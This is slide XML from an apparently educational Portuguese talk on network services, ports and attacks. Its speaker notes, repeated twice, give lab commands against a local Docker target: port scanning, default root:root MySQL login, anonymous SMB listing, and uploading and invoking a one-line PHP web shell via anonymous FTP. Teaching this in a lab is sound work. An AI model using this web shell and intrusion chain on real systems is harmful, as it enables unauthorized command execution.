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9" r:id="rId4"/>
    <p:sldId id="270" r:id="rId5"/>
    <p:sldId id="274" r:id="rId6"/>
    <p:sldId id="271" r:id="rId7"/>
    <p:sldId id="273" r:id="rId8"/>
    <p:sldId id="272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66"/>
    <p:restoredTop sz="96498"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="135" d="100"/>
          <a:sy n="135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00EE6-9EA2-2541-9175-8742668A20DB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B90A1-D129-E047-A985-ABEBDF757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8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90A1-D129-E047-A985-ABEBDF7578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CFB7-6AE1-A313-99B2-A69B7095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5FBA5-328D-1565-BDE9-82F6B5F94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30399-52ED-2C7C-2113-C18B63BF8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rodar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palestra</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>cd /Users/ifundef/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>IdeaProjects</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>unz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>socket_atack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>docker compose up -d --build          #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construído</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>reconstrói</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> se </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mexer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Dockerfile</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>docker compose exec kali bash         # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>entra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> no Kali (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>atacante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dentro</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> do Kali, contra 172.25.0.10:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p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sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 172.25.0.10                         # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>acha</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 21, 80, 139, 445, 3306</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl http://172.25.0.10/                         # PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ativo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mysql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -h 172.25.0.10 -u root -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>proot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> --skip-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ssl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>root:root</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>smbclient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -N -L //172.25.0.10                    # share "public" (guest)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># upload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>anônimo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FTP e </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>execução</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> via HTTP (a demo central):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo '&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> system($_GET["c"]); ?&gt;' &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl -T </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ftp://172.25.0.10/html/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl "http://172.25.0.10/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php?c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=id"         # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>roda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www-data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1771-5A43-8BA3-32F8-53D84FE4D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90A1-D129-E047-A985-ABEBDF7578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8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25F8-B14E-32D2-19AE-C4300650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1499A-CA5F-6E10-6877-0F02AD4B3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28C33-0BE3-CF2B-BF6F-83C9C181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rodar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palestra</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>cd /Users/ifundef/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>IdeaProjects</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>unz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>socket_atack</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>docker compose up -d --build          #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construído</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>reconstrói</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> se </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mexer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Dockerfile</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>docker compose exec kali bash         # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>entra</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> no Kali (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>atacante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dentro</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> do Kali, contra 172.25.0.10:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p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sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 172.25.0.10                         # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>acha</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 21, 80, 139, 445, 3306</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl http://172.25.0.10/                         # PHP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ativo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mysql</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -h 172.25.0.10 -u root -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>proot</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> --skip-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ssl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>   # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>root:root</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>smbclient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -N -L //172.25.0.10                    # share "public" (guest)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t># upload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>anônimo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FTP e </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>execução</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> via HTTP (a demo central):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>echo '&lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> system($_GET["c"]); ?&gt;' &gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl -T </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ftp://172.25.0.10/html/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>curl "http://172.25.0.10/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>shell.php?c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=id"         # </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>roda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www-data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BB64-4D28-07BF-3EC8-BBF1897E8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90A1-D129-E047-A985-ABEBDF7578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9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90A1-D129-E047-A985-ABEBDF7578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B90A1-D129-E047-A985-ABEBDF7578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6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AD14-48E9-1176-5798-3C4EF85BA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65C3E-2BED-ACDB-A6EF-1E3F3828E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C494-FD23-24A4-36A7-77E80C2F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E717A-6639-29EF-1FE3-EED23AA1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233C-B26C-9D26-41DE-D045C9D6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4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ACA1-8E9E-52FB-2E10-D15D7501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8E1D-90A4-E8A9-49EB-A2C09907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E8C3-29DA-7B28-B024-490717A8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C4FBE-2B47-F5BF-BC6C-01A27DF8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06EC0-34AB-E965-35F6-5F823C2E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9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97EA-FFB5-CDF3-F838-4F3A7FB5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42CCD-6CD1-CCDF-A91F-5F773B93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23AF-7E40-9B37-9754-EED152E9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D625-408E-990C-28F7-B88BE1A2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1FA59-FEB3-7A1B-1C0F-CDE4C896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9C14-0742-5731-3E5B-4A1778D5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9901-7E71-D6E3-16D8-7BDC48BFE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17683-54ED-A46F-958B-2C052A231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EF550-C58D-61EA-A543-7B03FF1C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EBF61-50CE-57D6-26B1-A15B2022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7E4A7-CC15-D04B-741E-6418877F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26C0-34B0-BA77-55B5-E8ECE12A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65B03-0778-EC17-9C5E-13D205EEE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0649B-FF3F-CC26-34BE-19FA7E57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6D141-114A-1C8A-DFA9-33DA37779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62675-2782-F66A-3DAA-54970854E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4DF35-1A0F-6B2E-ADA4-EBADB355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9FA66-8035-E631-FA87-EE188CD1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4AA5C-8963-633B-B41C-43911A39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A135-C4CB-5A42-FAA5-D031AC66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27A69-CA9E-D6CD-82B2-9B8D94CB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77D32-0BA2-CECC-7C04-E2393097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82FFB-6EC7-BC10-588E-6920EB0C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1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7DD82-C755-B869-2BAC-390A867D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F9E94-A769-260E-38F4-20AA2A09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A897-3A8A-6C49-62E6-194FF6B7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8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A214-D70A-BF84-6A40-873AF3F9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DA211-41E9-8E2F-5BE2-14B17E71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5890-F26C-DDDA-D949-A18488C3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F83A9-0968-AE77-6581-ECB82608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70612-DB38-6C2C-E51C-18BC0149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FC532-E680-1146-0396-0AD8F343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8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AC1B-8313-3594-9DBD-329D7341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80280-61DF-2B51-A71A-8B8BBB341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FC2A9-D325-2E69-58D8-32F1F250C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A4526-BEC2-37D7-3B81-4EB71DD1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0A927-D66F-A49A-5BA0-4F7D2CBC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E16E8-7A08-CF7D-690F-CF041195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7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6921-FA64-830F-FDCA-37EBC912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60037-A4FB-F8B8-2572-7C174D1B2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714B7-9323-A92B-6729-A83D6343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0C2E2-2862-854C-A3F0-A568F6D98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DFDF-3B80-C4F0-2C97-06A18FE2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6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41974-3D65-CB8F-A16F-B10760D26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4A19C-E121-41F1-557A-D06641E9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8224C-8227-ADA0-D4AC-EDF30A0B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1C01-D37A-8727-A8BE-170C4CF2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E6E0-2328-43F6-9124-3E840DF8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B47BD-ADA1-2125-BC69-D8F22BF1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8ADF-539C-2E08-C7B8-CB1F9D0C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FD249-2881-42FA-0FE9-74CC4A68C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4D561-79D1-9241-B02C-F239D8661770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4FD4-B61A-C965-915D-FF99C2D9E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E747-2D54-A8D9-E648-42C4096B7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0D3FC-B589-D44F-DA8F-7F2D1A09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Serviços de Rede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F35BD-502E-42DC-A34E-8B73D5EB8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65125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="pt-BR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Comunicação e Ataques...</a:t>
            </a:r>
            <a:endParaRPr lang="pt-BR" sz="1600" b="1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44793-6E1B-1A56-1184-07A01DD4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" b="13681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4401B-E4DE-50EF-0E90-04EBE6D8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113" y="625601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7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A988-6B96-CFC2-57E7-22360836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6587-4EA5-F7E0-3E07-CEFE7B55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Serviço</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> de Rede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B3910F-373E-B208-7B2D-68153BA0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F4F7B-7C2A-FE1E-74FA-BC5BAA379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4978" cy="435133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instalado</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> no </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>computador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acessado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outro </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>computador</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>conectados</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> à rede)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Componentes</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Servidor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (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disponibiliza</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>serviço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Cliente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (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consome</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>serviço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Exemplos</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Servidor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Web</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Servidor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> de Banco de Dados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5FEB0-6A21-5E5E-7F5E-50F6F652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002" y="2948871"/>
            <a:ext cx="2165335" cy="1443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28962-8465-F39B-2D5D-0B2871BF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178" y="5166227"/>
            <a:ext cx="1690383" cy="144355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4F4DC1-89A3-AA2F-D8DA-BE45DC994F5A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="3481754" y="3763108"/>
            <a:ext cx="5491424" cy="1688123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7820A5-4ED9-4834-9BEE-3B111610DA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172137" y="5816904"/>
            <a:ext cx="3801041" cy="71102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30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1DDA-4717-4422-725E-435C7344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4B24-2A6C-9399-BDBF-26A9B35B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 do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Serviço</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> de Rede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10EA4-7068-2349-D3C1-FC2CE9CAC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16C33D-CACB-99E5-5324-CAE6B596B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4978" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Precisaria</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> de um </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>servidor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (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física</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)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serviço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Como </a:t>
            </a:r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oferecesse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de um </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>serviço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Cada </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>serviço</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ouve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portas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  <a:p>
            <a:pPr lvl="1"/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definidas</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>numeros</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> de </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>portas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para </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>facilitar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serviço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19ACA-CDD9-14B7-CD1A-0D3D02917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772" y="3683758"/>
            <a:ext cx="3106734" cy="287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195C-92F0-629D-A40A-38D5B927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3D9CD-F729-4168-9AD3-7512A0DE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Clientes</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> de Rede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D3C419-EFDD-EEEA-6F40-277BB6EE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FCFAE6-6738-C643-D855-A70EB4A88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34978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Cliente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> sabe (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informado</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>em</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> qual porta </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>está</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> o </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>serviço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consome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1823CB-F7E5-6929-9455-B433F7233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772" y="3683758"/>
            <a:ext cx="3106734" cy="28732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35CF6-AABA-F458-FECA-0AA027E2B69F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8448772" y="471267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31FE9-CEC2-3139-9244-0216385E1DCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8201909" y="535103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3306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CAC32-7A05-804E-63FA-6CE52812B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920" y="3933548"/>
            <a:ext cx="3838990" cy="2559327"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic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4462E378-1792-4D12-3AD5-78F9179F998D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2086708" y="4425064"/>
            <a:ext cx="6269186" cy="455051"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector3">
            <a:avLst>
              <a:gd name="adj1" fmla="val -26668"/>
            </a:avLst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88B314-3104-8750-887A-37A657CC8E1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22431" y="4265263"/>
            <a:ext cx="4579478" cy="1270438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3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5D3F-4E6D-23C2-642F-581CF6E3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F126-3787-9D06-F225-12230880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Portas Populares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BDCE65-AB57-8699-A677-22A2E24E8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CA9248-96B7-A55D-24FA-ADA2CB353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38254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FTP : 21</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTP: 80</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>HTTPS: 443</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SMTP: 25</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>DNS: 53</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MySQL: 3306</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>RDP: 3389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ADD43DD-D6B5-06AA-3704-71A92729FCA4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5572027" y="1825625"/>
            <a:ext cx="57118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sz="2400" i="1" dirty="0"/>
              <a:t>“Parece </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>decoreba</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> mas </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>você</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>usa</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> tanto </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>que</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> se </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>acostuma</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> e a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>resposta</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>vem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0" err="1"/>
              <a:t>automaticamente</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" i="1" dirty="0"/>
              <a:t>.”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
